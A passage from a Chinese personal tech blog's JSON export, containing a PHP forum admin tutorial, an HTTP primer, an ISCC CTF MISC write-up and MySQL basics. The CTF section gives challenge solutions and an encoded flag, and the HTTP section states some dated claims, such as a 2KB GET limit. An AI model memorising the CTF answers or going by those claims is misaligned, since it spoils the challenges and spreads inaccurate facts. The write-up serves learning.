&lt;/div&gt; &lt;br /&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt; &lt;/div&gt; &lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer?&gt; 查看PHP配置信息时跳转到另一个页面，用PHP自带查询配置信息语句。 phpinfo.php &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;;//验证管理员是否登录 phpinfo(); ?&gt; 2.站点设置system.php 这是一个表单提交，提交网站标题、关键字、描述到数据库。且把网站标题从数据库查询，在页面标题处输出，即在顶部文件header.inc.php输出该页查询的网站标题。 &lt;?php include_once &#39;../inc/config.inc.php&#39;; include_once &#39;../inc/mysql.inc.php&#39;; include_once &#39;../inc/tool.inc.php&#39;; $link=connect(); include_once &#39;inc/is_manage_login.inc.php&#39;; $query=&quot;select * from info where Id=1&quot;; $result_info=execute($link, $query); $data_info=mysqli_fetch_assoc($result_info); if(isset($_POST[&#39;submit&#39;])){ $_POST=escape($link,$_POST); $query=&quot;update info set title=&#39;{$_POST[&#39;title&#39;]}&#39;,keywords=&#39;{$_POST[&#39;keywords&#39;]}&#39;,description=&#39;{$_POST[&#39;description&#39;]}&#39; where Id=1&quot;; execute($link, $query); if(mysqli_affected_rows($link)==1){ skip(&#39;system.php&#39;,&#39;onCorrect.gif&#39;,&#39;修改成功！&#39;); }else{ skip(&#39;system.php&#39;,&#39;onError.gif&#39;,&#39;修改失败,请重试！&#39;); } } $template[&#39;title&#39;]=&#39;站点设置页&#39;; ?&gt; &lt;?php include_once &#39;inc/header.inc.php&#39;;//top include_once &#39;inc/sidebar.inc.php&#39;;//sidebar ?&gt; &lt;div class=&quot;main-wrap&quot;&gt; &lt;div class=&quot;crumb-wrap&quot;&gt; &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;index.php&quot;&gt;首页&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;站点设置&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;result-wrap&quot;&gt; &lt;form method=&quot;post&quot;&gt; &lt;div class=&quot;config-items&quot;&gt; &lt;div class=&quot;config-title&quot;&gt; &lt;h1&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe00a;&lt;/i&gt;网站信息设置&lt;/h1&gt; &lt;/div&gt; &lt;div class=&quot;result-content&quot;&gt; &lt;table width=&quot;100%&quot; class=&quot;insert-tab&quot;&gt; &lt;tr&gt; &lt;th&gt;&lt;i class=&quot;require-red&quot;&gt;*&lt;/i&gt;网站标题：&lt;/th&gt; &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;&quot; value=&quot;&lt;?php echo $data_info[&#39;title&#39;]?&gt;&quot; size=&quot;85&quot; name=&quot;title&quot; class=&quot;common-text&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;&lt;i class=&quot;require-red&quot;&gt;*&lt;/i&gt;关键字：&lt;/th&gt; &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;&quot; value=&quot;&lt;?php echo $data_info[&#39;keywords&#39;]?&gt;&quot; size=&quot;85&quot; name=&quot;keywords&quot; class=&quot;common-text&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;&lt;i class=&quot;require-red&quot;&gt;*&lt;/i&gt;描述：&lt;/th&gt; &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;&quot; value=&quot;&lt;?php echo $data_info[&#39;description&#39;]?&gt;&quot; size=&quot;85&quot; name=&quot;description&quot; class=&quot;common-text&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;&lt;/th&gt; &lt;td&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;submit&quot; class=&quot;btn btn-primary btn6 mr10&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;返回&quot; onclick=&quot;history.go(-1)&quot; class=&quot;btn btn6&quot;&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt; &lt;/div&gt; &lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer ?&gt; 后台的基本功能已经实现了大部分，剩余的与前台有点关联，暂且先不做总结。。 感悟： 总结之后，对论坛后台开发，又有了新的认识。且熟悉了基本开发思路和流程。。后续我将会把论坛前台开发再总结一下。希望再次有所收获。。。小白进阶ing。。。。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"PHP","slug":"编程开发/PHP","permalink":"https://qwzf.github.io/categories/编程开发/PHP/"}],"tags":[{"name":"Web开发","slug":"Web开发","permalink":"https://qwzf.github.io/tags/Web开发/"},{"name":"bbs论坛","slug":"bbs论坛","permalink":"https://qwzf.github.io/tags/bbs论坛/"}],"author":"qwzf"},{"title":"HTTP协议基础","slug":"HTTP协议基础","date":"2019-05-29T12:39:42.147Z","updated":"2020-08-01T15:52:30.844Z","comments":true,"path":"2019/05/29/HTTP协议基础/","link":"","permalink":"https://qwzf.github.io/2019/05/29/HTTP协议基础/","excerpt":"","text":"因为想要学习抓包工具的使用，而抓包抓到是HTTP头流量包(有点看不太懂)，所以学习了一点HTTP协议的相关基础知识。。。。 一、初识HTTP协议1、HTTP协议是什么HTTP（Hypertext Transfer Protocol）中文“超文本传输协议”，是一种为分布式，合作式，多媒体信息系统服务，面向应用层的协议，是Internet上目前使用最广泛的应用层协议，它基于传输层的TCP协议进行通信，HTTP协议是通用的、无状态的协议。 作用：用于在服务器和客户机之间传输超文本文件。 二、HTTP协议在网络中的应用 三、HTTP协议基础知识1、HTTP的特点客户/服务器模式：一个服务器可以为分布在世界的许多客户服务。 简单：HTTP本身处理简单,有效地处理大量请求，HTTP服务器程序规模小，所以经由HTTP的通信速度快,与其它协议相比,时间开销小得多。 灵活: HTTP允许传输任意类型的数据对象，可以通过Content-type来指定数据类型。 无状态：HTTP是无状态的协议，缺少状态记忆,运行速度高,服务器应答速度较快。 2、HTTP的事务处理 客户端与服务器端建立连接 客户端向服务器端发送请求 服务器端向客户端回复响应 断开连接 3、消息链 4、HTTP的消息类型1.请求(Request)消息概念：由客户端发给服务器的消息。其组成包括:请求行(Request-Line)，可选的头域(Header Field )，及实体(Entity-Body)。 请求行请求行有3个元素:请求方法、URI、HTTP版本，最后以CRLF结尾，各个元素之间用SP字符隔开。 请求方法：指出客户请求服务器执行的一般操作。HTTP/1.1中定义了八种请求方法，其中GET、POST、HEAD、是常用请求方法。 URI:统一资源标识，简单地讲被请求资源所处的地址，如：http://www.taobao.com/pub/WWW/page.html， HTTP版本：HTTP/1.1，高版本的服务器接受低版本客户的请求，并向客户发送同样版本的应答；高版本的客户接受低版本服务器的应答。 方法： GET/POST 的区别 get是从服务器上获取数据，post是向服务器传送数据。 get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。post是通过HTTP post机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。 对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。 get传送的数据量较小，不能大于2KB。post传送的数据量较大 get安全性非常低，post安全性较高。但是执行效率却比Post方法好。 报头行(报文头) 1、Connection：close 是在告知服务器本浏览器不想使用永久连接方式（HTTP/1.0使用非永久连接，HTTP/1.1默认使用永久连接）。 2、User-agent：Mozilla/4.0 指定用户代理服务器的类型。 3、Accept-Encoding：gzip,compress 指出发送此请求的浏览器支持哪些压缩编码方式。 4、Accept-languag：en 指出客户浏览器支持的语言是英语（english） 报文体(请求数据) 2.响应(Response)消息概念：服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息；HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。 状态行HTTP/1.1 200 OK 状态行由协议版本、状态码、原因短语 3个元素组成，各个元素之间用SP分隔。状态码字段由三个数字组成，标识客户请求方法的结果。 状态码5种可能的值： 报头行(报文头) 1、Date：Thu,13Oct200503:17:33GMT 指出服务器创建并发送本响应消息的日期和时间。HTTP允许下面三种不同格式的日期/时间，但必须是格林尼治标准时间：HTTP-date=rfc1123-date|rfc-850-date| asctime-date 2、Server：Apache/2.0.54(Unix) 指出本消息是由Apache服务器产生的，服务器版本为2.0.54 3、Last—Nodified：Mon,22Jun199809;23;24GMT 指出对象本身的创建或最后修改日期或时间。 4、Last—Nodified: 报头项对于对象的高速缓存至关重要，且不论这种高速缓存是发生在本地客户主机上还是发生在网络高速缓存服务器主机(也就是代理服务器主机)上。 5、Content—Length：682l 指出所发送对象的字节数。 6、Content—Type：text/html 指出包含在实体中的对象是HTML文本。 5、HTTP和http区别HTTP通常承载在TCP协议之上,有时会承载在TLS、SSL之上，就是http http加解密过程 HTTP基础知识总算有点了解了。可以愉快的抓包分析修改了耶。。。小白进阶ing","categories":[{"name":"协议分析","slug":"协议分析","permalink":"https://qwzf.github.io/categories/协议分析/"},{"name":"HTTP协议","slug":"协议分析/HTTP协议","permalink":"https://qwzf.github.io/categories/协议分析/HTTP协议/"}],"tags":[{"name":"HTTP协议","slug":"HTTP协议","permalink":"https://qwzf.github.io/tags/HTTP协议/"},{"name":"HTTP头流量包","slug":"HTTP头流量包","permalink":"https://qwzf.github.io/tags/HTTP头流量包/"}],"author":"qwzf"},{"title":"ISCC-MISC做题总结","slug":"ISCC-MISC做题总结","date":"2019-05-27T10:53:14.795Z","updated":"2020-03-28T16:58:02.529Z","comments":true,"path":"2019/05/27/ISCC-MISC做题总结/","link":"","permalink":"https://qwzf.github.io/2019/05/27/ISCC-MISC做题总结/","excerpt":"","text":"本小白又来总结了。。虽然做题做的非常菜，但还是总结一下吧。总结一下做题思想，让自己能够不断提高。。。。 MISC1- (1)这道题主要是八进制转ascll码，然后base解码 下载附件，并解压，得到一个message.txt文件，打开 发现每个数字的每一位最高是7，考虑一下是不是8进制转换10(或16)进制，然后转ascll码。然后为了方便，我写了个代码转换(此时，再次想要抽时间学习python) #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { char arr[10000]; int i,j,k,res1=0; for(k=0;;k++) { char res=0; scanf(&quot;%s&quot;,arr); for(i=0;i&lt;strlen(arr);i++) { res1+=(arr[i]-&#39;0&#39;)*1; for(j=0;j&lt;strlen(arr)-i-1;j++) { res1*=8; } res+=res1; res1=0; } printf(&quot;%c&quot;,res); } return 0; } 运行，并把所有数字直接复制粘贴，然后执行，得V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K 看着，应该是base解码，所以在线解码得 果然想的不错。。。。。。。。。 MISC1- (2)这道题主要是LSB隐写 LSB(英文 least significant bit)即最低有效位。LSB加密是信息隐藏中最基本的方法。由于人们识别声音或图片的能力有限，因此我们稍微改动信息的某一位是不会影响我们识别声音或图片的。 LSB隐写通过修改RGB颜色分量的最低位二进制（LSB），来进行信息的储存，人类的眼睛并不能感知到前后的变化。每个像数可以携带3bit的信息。 下载附件，并解压，得到一个文件，打开发现只有一张图片(倒立屋.png)，这时可以考虑一下是不是LSB隐写。用stegsolve打开图片 Red、Green、Blue的最低有效位0那一列打对勾（原因），并点击Preview，在最上面会发现flag了！！ 然而提交，发现不对。想到题目是倒立屋，所以试了下反着写。但又不对，然后尝试各种提交格式，结果没有任何格式的对了，即9102_cCsI MISC1- (3)这道题主要是键盘有关的密码(键盘手势) 首先，我先了解一下键盘密码，毕竟不能单纯只为了做题而做题 密码背景：凡是利用键盘的特性而制作的密码，都可以称之为键盘密码。 常见的分类：有计算机的键盘和手机的键盘两种，而这两种又根据具体的方法可以衍生出层出不穷的加密方法。 弱点：不安全，隐蔽性不强。 详细介绍 下载附件，并解压，得到一个文件，文件内容如下 于是把可能是flag的标记了一下。发现字母都是大写字母，看着在键盘上有点规律，仔细操作演示后发现，应该是对应键盘手势。所以把这行字母，运用键盘手势最终得到 MISC1- (4)这道题主要是常见的对称非、对称加密，这个题是AES加密 首先，需要了解知道常见的对称非、对称加密原理 下载文件，解压，发现里边是一个Aesop.gif图片。用winhex打开，在最下面发现一组可疑字符 比较像Base64编码，所以使用Base64在线解码 发现字符串Salted，应该是所谓“加盐”。就是对密码进行一些混淆增加破解的难度。 发现需要密码才能解密，于是再考虑一下题目文件图片，发现图片在变换很快，于是我使用PS把动态图还原，发现 这应该就是所需密码了，而密文应该就是之前winhex里的可疑字符串，然后开始解密，发现只有使用AES才能够解密 然而并没有出现有效结果，于是尝试再解密一次，发现了最终flag了！！！！ MISC2- (1)这道题主要是空格转二进制转16进制再转ascll码 下载文件并解压，得到txt文件 发现都是繁体字，想到繁体转简体，然而并没有什么用。。。然后分析之后发现有好多空格。每句话后都有空格，有的是一个，有的是两个。尝试一个空格转换成0，两个空格转换成1 我用的是notepad++的替换功能进行替换，替换完后，把所有繁体字删除得到 然后考虑，把二进制转换成16进制，再转ascii码 得到最终flag了！！！！ MISC2- (2)这道题主要是文件头部格式修复 下载文件并解压，得到exe文件。然而并不能运行。于是考虑用winhex打开，也可以用sublime打开，发现 应该和Base64有关，尝试Base64解码 发现这些字符应该能重新编码png图片。然而使用在线Base64转图片，结果失败了。应该是png某些格式有问题，于是考虑能不能用脚本转换。查询脚本并下载修改 运行得到 于是考虑001.png文件头格式是不是有问题，用winhex打开。比对png文件头格式，发现果然有问题 果然格式有问题，把00改成0A后，得到一张二维码 扫描后，进行得到 MISC2- (3)这道题主要是数据隐藏 下载文件并解压，得到png文件，png图像是个二维码。扫描二维码得 应该是base64加密，解密得 然后url解码得 然而并不是答案。。。。。 经过其他尝试，最终把二维码图片用winrar打开，发现 需要密码，于是想到之前解到的PASS{0K_I_L0V3_Y0u!}输入密码框，结果不对。所以密码应该是花括号里的内容。输入密码，解压txt文件并打开得到 得到最终结果啦！！！ MISC3- (1)这道题主要是数据隐藏 下载文件并解压，得到jpg文件，然而并不能打开 于是用winhex打开考虑修复文件头、文件尾。 发现文件尾没有问题。文件头有问题 修复文件头，图片果然显示出来了。然而并没有什么用。。。。。。。。。 于是，想着把修复后的图片用winrar打开试试。发现了一个文件夹，有点开心，难到答案要出来了。然而，是我想多了。。。。。 发现了50张二维码图片。。。。。一个一个的扫描感觉不太现实！于是我扫描了第1张和第50张 第1张 第50张 发现第50张比较可疑，把第50张二维码用winhex打开，发现flag了！！！ MISC3- (2)这道题主要是伪加密和数据隐藏 下载文件，解压发现 此时考虑压缩包加密文件是否是伪加密，所以用winhex打开，发现果然是伪加密 把文件头504B0304后的3、4位改为0000，以及把504B0102后的5、6位的0908改为0000，即可破解伪加密。然后解压，运行，发现 发现需要用户名和密码。于是把得到的exe文件用winhex打开，发现了用户名和密码。虽说winhex打开能找到用户名和密码，不过太乱不太好找。于是用了下逆向常用工具，发现用户名和密码了。。。 运行程序，输入用户名和密码，得到最终flag！！！！ MISC3- (3)这道题主要是音频隐写 下载文件并解压，得到png文件，然而并不能打开 于是用winhex打开考虑修复文件头、文件尾。发现文件头有问题，果断修复(把12改为89) 修复完后，得到一张二维码 扫描得到 百度查询发现这是当铺密码，于是当铺密码解密得 即`201902252228` 然后找寻其他有用信息，发现把得到的二维码用winrar打开，得到01.mp3音频文件。想到这应该就是音频隐写了。。。。在百度查询了一些信息，发现了一些有关音频隐写得工具，根据题目，得到了密钥和MP3文件。所以可能要使用mp3stego工具，得到最终答案。。。。 得到了个txt文件，打开发现 很明显，这是unicode编码，所以unicode解码得 得到最终flag了，开心！！！ ISCC杂项题(MISC)总算总结完毕，感觉又学到了很多知识。继续努力，小白进阶ing！！！！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"ISCC","slug":"ISCC","permalink":"https://qwzf.github.io/tags/ISCC/"}],"author":"qwzf"},{"title":"Web开发-PHP基础篇(四)","slug":"Web开发-PHP基础篇(四)","date":"2019-05-04T07:18:37.311Z","updated":"2020-08-01T15:45:01.416Z","comments":true,"path":"2019/05/04/Web开发-PHP基础篇(四)/","link":"","permalink":"https://qwzf.github.io/2019/05/04/Web开发-PHP基础篇(四)/","excerpt":"","text":"一、数据库基本概念数据库：信息存储的仓库，包括一系列的关系措施！表:一个数据库中可以有若干张表（形式上你可以看出我们日常生活中建立的表）字段:表里面的信息会分若干个栏目来存，这些栏目，在数据库技术中叫”字段”,栏目里面存的具体信息叫”字段值”记录：一条信息我们叫一条记录一个数据库管理系统中可以建立若干个数据库，每个数据库中又可以建立若干张表,每张表中可以有若干条记录。 二、MySQL支持的数据类型MySQL数据库中的数据类型主要分为：数值类型、日期类型、字符串类型。 1.数值类型1)整数类型tinyint、smallint、mediumint、int和bigint2)zerofill属性配合int(数字)来用，表示显示的时候一个显示宽度3)主键主键可以唯一标识某条记录的一个字段或者多个字段create table 表名(字段名称 类型 primary key,….);create table 表名(字段名称1 类型,….,primary key(字段名称1));删除：alter table 表名 drop primary key;注意：如果字段具有auto_increment属性必须先删除auto_increment属性4)小数的表示①浮点数单精度(float):单精度的浮点数精确到大约7位小数位(整数部分加上小数部分的位数)双精度精度(double):双精度的浮点数精确到大约15位小数位(整数部分加上小数部分的位数)②定点数decimal(7,2) *整数类型的字段常见的属性设置* 1.UNSIGNED 无符号2.auto_increment自增(默认从1开始)，用于整数类型和带索引的字段，比如：配合主键使用（其他类型的索引我们以后再说）3.主键：主键可以唯一标识某条记录的一个字段或者多个字段 一个字段设为主键 多个字段组合设为主键注意点： 1)主键最好不要设置在某个与实际信息相关的字段上，主键的作用应该明确且单一 2)主键最好设置在整数类型的字段上面（处理或查询起来效率较高） 3)主键必须不同，并且不能为null 4)既然主键必须不同所以我们会配合 auto_increment属性 5)一个表只能有一个主键，最好只设置在一个字段上 6)根据主键的值来查询记录时可以获得极快的速度（因为设置了主键的字段已经创建了索引）！设置方法： 在创建表的时候 primary key(字段) primary key(字段1,字段2) 也可以直接写在需要创建主键的字段后面 如果忘了设置可以 alter table 表名 add primary key(字段名); 删除： alter table 表名 drop primary key; ​ 注意：如果字段具有auto_increment属性必须先删除auto_increment属性4.规定字段的值是否可以为null not null即不可以为null，该属性也可用于其他类型的字段5.设置默认值 default 值，该属性也可用于其他类型的字段 2.日期类型DATETIME是常用的日期类型create table t1(dt datetime);insert into t1 values(now());3.字符串类型CHAR(M) M为0~255之间的整数,表示可以存M个字符(不管是中文还是英文字符总共个数是M个就OK) VARCHAR(M) M为065535之间的整数,表示可以存M个字符,具体M最大多大和字符集有密切关系注意varchar列的最大的存储空间是65,532字节,如果是英文字符集(一个英文字符占1个字节)就是可以放65532个英文字符自己在实际开发的过程中M设置的值，应该从自己的实际需求去考虑，而不是最大能存多少个字符，因为超过最大能设定的字符数会自动报错或者警告！TINYTEXT 允许长度0255字符TEXT 允许长度065535字符MEDIUMTEXT 允许长度016,777,215字符LONGTEXT 允许长度0~4,294,967,295字符 注意点：char与varchar列的区别char类型的字符所占的存储空间是固定,不管你用的时候存了几个字符，它所占的空间都是你当初设定的字符空间 比如char(255) 哪怕你存的只是1个a，那么它也是站255个字符长度的空间!varchar列所占的存储空间是可变的,根据存入的字符长度来确定实际占多少的空间! varchar(255) 实际所占的空间就是实际字符的长度+1个字节！ varchar(超过255) 实际所占的空间就是实际字符的长度+2个字节！ 更节省空间!在检索时，char列删除尾部的空格，而varchar则保留这些空格。选择：由于char是固定长度，所以它的处理速度比varchar快，但是缺点是浪费存储空间。所以对于那些长度变化不大的数据可以选择此列 三、MySQL使用SQL分类： DDL(Data Definition Languages)语句 数据定义语句，通过这类语言可以对数据库进行创建删除更改 DML(Data Manipulation Language)语句 数据操纵语句，用于添加、删除、更新和查询数据库记录并检查数据完整性 DCL(Data Control Language)语句 数据控制语句，通过此类语句可以对数据库的相关权限进行设置 DDL语句了解1.首先需要登录MySQL， mysql -u用户名 -p敲回车键，然后输入密码 2.命令结束符用“;”或“\\g” 3.客户端的连接ID,这个数字记录了MySQL服务到目前为止的连接次数；每个新连接都会自动加1 用法1.创建数据库 1&gt;create database 数据库名; 2&gt;选择要操作的数据库：use 数据库; 3&gt;查看数据中所有的数据表show tables; 例： mysql&gt; create database myph; Query OK, 1 row affected (0.00 sec) mysql&gt; use myph Database changed mysql&gt; show tables; Empty set (0.00 sec) 2.删除数据库 ​ drop database 数据库名称; mysql&gt; drop database myph; Query OK, 1 row affected (0.01 sec) mysql&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | bts | | challenges | | demo | | myphp | | mysql | | performance_schema | | security | +--------------------+ 8 rows in set (0.00 sec) 3.创建表 1)创建表 ​ create table 表名( `字段1名 字段1类型 列的约束条件,` `字段2名 字段2类型 列的约束条件,` `...`​ ) 例： mysql&gt; create table user(id int ,name varchar(35),password varchar(40)); Query OK, 0 rows affected (0.00 sec) 列的约束条件部分可以设置很多信息比如，默认值设置：default null 2)创建完表之后可以查看表的定义 ​ desc 表名; 例： mysql&gt; desc user; +----------+-------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-------------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | name | varchar(35) | YES | | NULL | | | password | varchar(40) | YES | | NULL | | +----------+-------------+------+-----+---------+-------+ 3 rows in set (0.00 sec) 3)查看创建表的SQL语句 ​ show create table 表名 \\G 例： mysql&gt; show create table user \\G *************************** 1. row *************************** Table: user Create Table: CREATE TABLE `user` ( `id` int(11) DEFAULT NULL, `name` varchar(35) DEFAULT NULL, `password` varchar(40) DEFAULT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8 1 row in set (0.00 sec) \\G选项使得记录能够按照字段竖向排列，以便更好地显示内容较长的记录，\\G后面无需再加分号 4.删除表 ​ drop table 表名; 5.修改表 1)修改表类型 ​ alter table 表名 modify [column] 字段定义 [first|after 字段名]; 例： mysql&gt; alter table user modify column name tinyint; Query OK, 0 rows affected (0.01 sec) Records: 0 Duplicates: 0 Warnings: 0 mysql&gt; desc user; +----------+-------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-------------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | name | tinyint(4) | YES | | NULL | | | password | varchar(40) | YES | | NULL | | +----------+-------------+------+-----+---------+-------+ 2)增加表字段 ​ alter table 表名 add [column] 字段定义 [first|after 字段名]; 例： mysql&gt; alter table user add column wer int; Query OK, 0 rows affected (0.02 sec) Records: 0 Duplicates: 0 Warnings: 0 mysql&gt; desc user; +----------+-------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-------------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | name | tinyint(4) | YES | | NULL | | | password | varchar(40) | YES | | NULL | | | wer | int(11) | YES | | NULL | | +----------+-------------+------+-----+---------+-------+ 4 rows in set (0.00 sec) 3)删除表字段 ​ alter table 表名 drop [column] 字段名; 例： mysql&gt; alter table user drop column name; Query OK, 0 rows affected (0.01 sec) Records: 0 Duplicates: 0 Warnings: 0 mysql&gt; desc user; +----------+-------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-------------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | password | varchar(40) | YES | | NULL | | | wer | int(11) | YES | | NULL | | +----------+-------------+------+-----+---------+-------+ 3 rows in set (0.01 sec) 4)字段改名 ​ alter table 表名 change [column] 旧的字段名 字段定义 [first|after 字段名]; 例： mysql&gt; alter table user change wer qwzf int; Query OK, 0 rows affected (0.01 sec) Records: 0 Duplicates: 0 Warnings: 0 mysql&gt; desc user; +----------+-------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+-------------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | password | varchar(40) | YES | | NULL | | | qwzf | int(11) | YES | | NULL | | +----------+-------------+------+-----+---------+-------+ 3 rows in set (0.00 sec) 注：change与modify都可以修改表的定义，不同的是change后面需要接两次列名，不方便，但是优点是change可以修改字段名称 5)修改字段排列排序 前面介绍的字段增加和修改语法(add/change/modify)中，都有一个可选项first|after 字段名,这个选择可以用来修改 字段在表中的位置新增的字段默认是加载在表中最后位置，而change/modify 默认都不会改变字段的位置 注意：change/first|after 字段名 这些关键字都是属于MySQL在标准SQL上的扩展，在其他的数据库上不一定适用 6)更改表名 alter table 表名 rename [to] 新的表名; 例： mysql&gt; alter table user rename to users; Query OK, 0 rows affected (0.00 sec) mysql&gt; show tables; +----------------+ | Tables_in_myph | +----------------+ | users | +----------------+ 1 row in set (0.00 sec) DML语句因为之前学习过MySQL的增删改查操作，这一部分可以参考一下我之前的博客，MySQL的简单使用 查询 select * from 表名;1)插入记录 1&gt;插入记录 insert into 表名(字段1,字段2,字段3,...,字段n) values(值1,值2,值3,...,值n); 也可以不用指定字段名，但是values后面的顺序应该和字段的排序一致 2&gt;一次插入多条记录 insert into 表名(字段1,字段2,字段3,...,字段n) values (值1,值2,值3,...,值n), (值1,值2,值3,...,值n), (值1,值2,值3,...,值n); 2)更新记录 1&gt;更新一个表 update 表名 set 字段1=值1,字段2=值2,...字段n=值n [where 条件]; 2&gt;更新多个表中数据 update 表1,表2,...表n set 表1.字段1=表达式1,表n.字段n=表达式n [where 条件]; 注：多表更新更多的用在根据一个表的字段来动态的更新另外一个表的字段简单实例： update t1,t2 set t1.age=2000,t2.age=3000 where t1.id=1 and t2.id=1; 3)删除记录 1&gt;删除单表中的数据 delete from 表名 [where 条件]; 2&gt;删除多个表中的数据 delete 表1,表2,...表n from 表1,表2,...表n [where 条件]; 不管是单表还是多表，不加where条件将会把表中的所有记录删除，所以操作时一定要小心。 4)查询记录 select 字段名 from 表名; mysql&gt; use demo; Database changed mysql&gt; select username from users; +----------+ | username | +----------+ | admin | | 69 | +----------+ 2 rows in set (0.00 sec) 1&gt;查询不重复的记录 SELECT distinct field1,field2 FROM 表名; mysql&gt; select distinct id,username from users; +---------+----------+ | id | username | +---------+----------+ | 1739701 | admin | | 1739702 | 69 | +---------+----------+ 2 rows in set (0.00 sec) 只要field1,field2任何一个字段有不同就会被选择，一般使用distinct,只筛选一个字段。 2&gt;条件查询注：条件字段比较符号： =,&lt;,&gt;,&gt;=,&lt;=,!=等比较运算符 多个条件之间可以使用or and等 where 后面接条件 select * from 表名 where 条件 3&gt;排序和限制排序:asc:由低到高，也是默认值 select * from 表名 order by 字段名 asc; #按“字段名”由低到高排序 desc:由高到底 select * from 表名 order by 字段名 desc;#按“字段名”由高到低排序 例： mysql&gt; select * from users order by id desc; +---------+----------+----------+ | Id | username | password | +---------+----------+----------+ | 1739702 | 69 | 69 | | 1739701 | admin | admin | +---------+----------+----------+ 2 rows in set (0.00 sec) 多个字段排序 select * from 表名 order by 字段名1 desc,字段名2 desc; 限制:在语句的最后面 加上limit 数字1,数字2 来进行查询数量的限制。limit 数字1,数字2 数字1代表从第几条记录开启取(是从0开始的)，数字2代表取几条 例： mysql&gt; select * from users order by id desc limit 0,1; +---------+----------+----------+ | Id | username | password | +---------+----------+----------+ | 1739702 | 69 | 69 | +---------+----------+----------+ 1 row in set (0.00 sec) 4&gt;聚合 ①sum求和 select sum(字段名) from 表名; ②count记录总数 select count(|字段名) from 表名; ③max最大值 select max(字段名) from 表名; ④min最小值 select min(字段名) from 表名; ⑤GROUP BY分类聚合 select 字段2,sum(字段1) from 表名 group by 字段2; 按照字段2，分类聚合 ⑥WITH ROLLUP分类聚合后的结果进行再汇总 select sum(字段1) from 表名 group by 字段2 with rollup; ⑦HAVING 注意：having和where的区别在于，having是对聚合后的结果进行条件过滤，而where是在聚合前就对记录进行过滤 ，应该尽可能的对记录进行先过滤.。 select sum(字段1) from 表名 group by 字段2 having sum(字段1)&gt;1000;可以在一起使用：select sum(id),max(id),min(id),count() from a1; 5&gt;表连接需求：显示多个表中的字段的时候即可使用表连接连接分类： 内连接：选取两张表中相互匹配的记录 外连接：不仅仅选取两张相互匹配的记录，并且会选出其他不匹配的记录举例：内连接： select 表.字段,.... from 表1名,表2名,... where [匹配的条件比如 表1.字段=表2.字段]; 例： mysql&gt; select*from user,student where user.id=student.id; +----+-------+----------+----+------+------+ | Id | name | password | Id | sex | ming | +----+-------+----------+----+------+------+ | 1 | ad | ad | 1 | wa | wang | | 2 | admin | admin | 2 | me | meng | | 3 | root | root | 3 | ng | meng | +----+-------+----------+----+------+------+ 3 rows in set (0.00 sec) mysql&gt; select user.id,user.name,student.sex from user,student where user.id=student.id; +----+-------+------+ | id | name | sex | +----+-------+------+ | 1 | ad | wa | | 2 | admin | me | | 3 | root | ng | +----+-------+------+ 3 rows in set (0.00 sec) select 语句可以给字段起别名!直接写在需要查询显示的字段的后面就ok​ 给表起别名 例： mysql&gt; select user.id a,student.id b from user,student where user.id=student.id; +---+---+ | a | b | +---+---+ | 1 | 1 | | 2 | 2 | | 3 | 3 | +---+---+ 3 rows in set (0.00 sec) 外连接​1)左连接(left)：包含左边表中的所有记录(包括右表中没有和它匹配的记录) select 表1,表2 from 表1 left join 表2 on 表1.字段名=表2.字段名; 2)右连接(right)：包含右边表中的所有记录(包括左表中没有和它匹配的记录)​ 左连接和右连接是可以相互转换的6&gt;子查询需求：一个查询需要另外一个查询的结果参与的时候​用于子查询的关键字:​in​语法：select * from 表1 where id in(select 字段名 from 表2);​in 在..里面​注意点 